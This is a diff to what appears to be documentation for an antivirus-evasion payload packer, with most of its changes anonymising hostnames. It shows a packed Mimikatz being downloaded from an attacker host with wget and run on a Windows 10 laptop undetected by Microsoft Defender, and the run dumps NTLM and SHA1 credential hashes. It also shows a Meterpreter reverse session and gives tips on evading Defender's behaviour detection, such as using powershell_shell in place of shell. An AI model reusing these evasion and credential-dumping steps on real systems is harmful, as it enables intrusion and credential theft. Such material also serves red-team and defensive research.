@@ -122,16 +122,16 @@ drwxr-xr-x  2 jeff jeff    4096 Dec 21 01:42 __pycache__
 Step 3 - Download and execute the packed version of Mimkatz on a Windows 10 laptop without being detected nor blocked by the MS Defender AV
 ---------------------------------------------------------------------------------------------------------------------------------------------
 
-PS C:\Users\Administrator.PO718687\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile payload.exe
+PS C:\Users\Administrator\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile payload.exe
 
-PS C:\Users\Administrator.PO718687\Downloads> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
 
 RealTimeProtectionEnabled : True
 IoavProtectionEnabled     : True
 AntispywareEnabled        : True
 
 
-PS C:\Users\Administrator.PO718687\Downloads> .\payload.exe
+PS C:\Users\Administrator\Downloads> .\payload.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -148,27 +148,27 @@ mimikatz # sekurlsa::logonpasswords
 Authentication Id : 0 ; 33201662 (00000000:01fa9dfe)
 Session           : Interactive from 2
 User Name         : Administrator
-Domain            : PO718687
-Logon Server      : PO718687
+Domain            : Laptop2
+Logon Server      : Laptop2
 Logon Time        : 20/12/2022 19:52:06
 SID               : S-1-5-21-936125016-2310263949-2175806047-500
         msv :
          [00000003] Primary
          * Username : Administrator
-         * Domain   : PO718687
+         * Domain   : Laptop2
          * NTLM     : 36f7a3ebaa54935ecf03678e<snip>
          * SHA1     : d5feabcececab0e16c2cbb39<snip>
         tspkg :
          * Username : Administrator
-         * Domain   : PO718687
+         * Domain   : Laptop2
          * Password : <snip>
         wdigest :
          * Username : Administrator
-         * Domain   : PO718687
+         * Domain   : Laptop2
          * Password : (null)
         kerberos :
          * Username : Administrator
-         * Domain   : PO718687
+         * Domain   : Laptop2
          * Password : (null)
         ssp :
         credman :
@@ -252,8 +252,9 @@ Important note regarding AV detection
 -------------------------------------
 => In general, with Metasploit if you want to limit the chance of being detected & blocked by antivirus solutions, it is recommanded to avoid using known 
    post-exploitation modules and to use the Meterpreter session mainly as a way to pivot and perform lateral movement (i.e. socks_proxy + proxychains).  
-   Indeed, if you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will often detect these 
-   actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
+   Indeed, if you use well knwon post-exploitation modules like "hashdump" or even just the "shell" command, antivirus like MS Defender will often detect 
+   these actions as 'Behavior:Win32/Meterpreter.gen!D' or 'Behavior:Win32/Meterpreter.A!sms' and will kill the Meterpreter session.
+   For instance, the Meterpreter command "Powershell_shell" is less often detected than the command "shell".
 
 
 ------------------------------------------------------------------------------------------------------------------------------------
@@ -307,23 +308,27 @@ Active sessions
 
   Id  Name  Type                     Information                        Connection
   --  ----  ----                     -----------                        ----------
-  1         meterpreter x64/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+  1         meterpreter x64/windows  Laptop2\Administrator @ Laptop2  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
 
 msf6 exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > getuid 
-Server username: PO718687\Administrator
+Server username: Laptop2\Administrator
 
-meterpreter > shell
-Process 7828 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.19044.2364]
-(c) Microsoft Corporation. All rights reserved.
+meterpreter > load powershell
+Loading extension powershell...Success.
 
-C:\Users\Administrator.PO718687\Downloads>exit
-exit
+meterpreter > powershell_shell
+PS > ls
 
-meterpreter > 
+    Directory: C:\Users\Administrator\Downloads
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a---         05/12/2022     17:11      219632512 SoapUI-x64-5.7.0.exe
+-a---         28/12/2022     10:47        3365132 SuperRevShellHttps.exe
+-a---         23/12/2022     07:21      110287880 VirtualBox-7.0.4-154605-Win.exe
 
 <SNIP>
